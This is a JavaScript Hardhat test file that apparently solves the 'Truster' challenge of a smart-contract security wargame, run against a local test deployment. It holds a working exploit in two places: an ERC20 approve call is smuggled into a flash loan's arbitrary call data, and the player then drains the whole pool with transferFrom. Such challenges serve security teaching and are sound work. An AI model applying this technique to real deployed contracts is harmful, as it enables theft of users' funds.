const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        let iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
        let data = iface.encodeFunctionData("approve(address,uint256)",[player.address,TOKENS_IN_POOL])
        await pool.connect(player).flashLoan(0,player.address,token.address,data);
        await token.connect(player).transferFrom(pool.address,player.address,TOKENS_IN_POOL);

        // const TrusterAttackerFactory = await ethers.getContractFactory("AttackTruster", player);
        // await TrusterAttackerFactory.deploy(TOKENS_IN_POOL, this.pool.address, this.token.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});


describe("[Test] Truster", function () {
  let deployer, player;
  let token, pool;

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    pool = await (
      await ethers.getContractFactory("TrusterLenderPool", deployer)
    ).deploy(token.address);
    await token.transfer(pool.address, TOKENS_IN_POOL);
  });

  it("Initial player balance", async function () {
    expect(await token.balanceOf(player.address)).to.equal(0);
  });
  it("Pool Balance before/after loans", async function () {
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
  });
  it("Checking all the tokens in pool", async function () {
    expect(await pool.token()).to.eq(token.address);
  });

  it("Correct balances on transfer", async function () {
    let ABI = ["function approve(address to, uint256 amount)"];
    let iface = new ethers.utils.Interface(ABI);
    const data = iface.encodeFunctionData("approve", [
      player.address,
      TOKENS_IN_POOL,
    ]);
    await pool.flashLoan(0, player.address, token.address, data);
    await token
      .connect(player)
      .transferFrom(pool.address, player.address, TOKENS_IN_POOL);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(0);
  });
});
